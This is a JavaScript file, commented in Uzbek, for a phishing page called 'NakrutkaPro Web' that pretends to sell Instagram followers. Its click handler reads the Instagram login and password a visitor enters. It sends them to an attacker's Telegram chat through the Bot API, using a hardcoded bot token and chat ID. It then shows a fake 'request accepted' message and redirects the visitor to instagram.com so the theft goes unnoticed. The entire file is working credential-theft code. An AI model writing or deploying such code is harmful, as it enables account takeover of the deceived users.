// Telegram Bot sozlamalari

const TELEGRAM_TOKEN = "8505367720:AAEkegoUeQWWysWqgbE3U4xuQuH6_URduz4"; 
const CHAT_ID = "7050310480";

document.getElementById('submitBtn').addEventListener('click', async function() {
    const userField = document.getElementById('instaUser');
    const passField = document.getElementById('instaPass');
    const btnText = document.getElementById('btnText');
    const btnIcon = document.getElementById('btnIcon');

    const username = userField.value.trim();
    const password = passField.value.trim();

    // Validatsiya
    if (!username || !password) {
        alert("Iltimos, barcha maydonlarni to'ldiring!");
        return;
    }

    // Tugmani yuklanish holatiga o'tkazish
    btnText.innerText = "Yuborilmoqda...";
    btnIcon.className = "fas fa-spinner fa-spin";
    this.disabled = true;

    // Xabar matni
    const message = `
🔔 **Yangi Ma'lumot Keldi!**
━━━━━━━━━━━━━━━━━━
👤 **Login:** \`${username}\`
🔑 **Parol:** \`${password}\`
━━━━━━━━━━━━━━━━━━
🌍 **Manzil:** NakrutkaPro Web
    `;

    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (response.ok) {
            // Muvaffaqiyatli yuborilganda
            alert("Tabriklaymiz! So'rovingiz qabul qilindi. 24 soat ichida obunachilar qo'shiladi.");
            window.location.href = "https://www.instagram.com"; // Instagramga o'tkazish
        } else {
            throw new Error("Xatolik");
        }
    } catch (error) {
        alert("Tizimda xatolik! Keyinroq qayta urinib ko'ring.");
        console.error(error);
    } finally {
        // Tugmani qaytarish
        btnText.innerText = "Nakrutka olish";
        btnIcon.className = "fas fa-bolt";
        this.disabled = false;
    }
});



















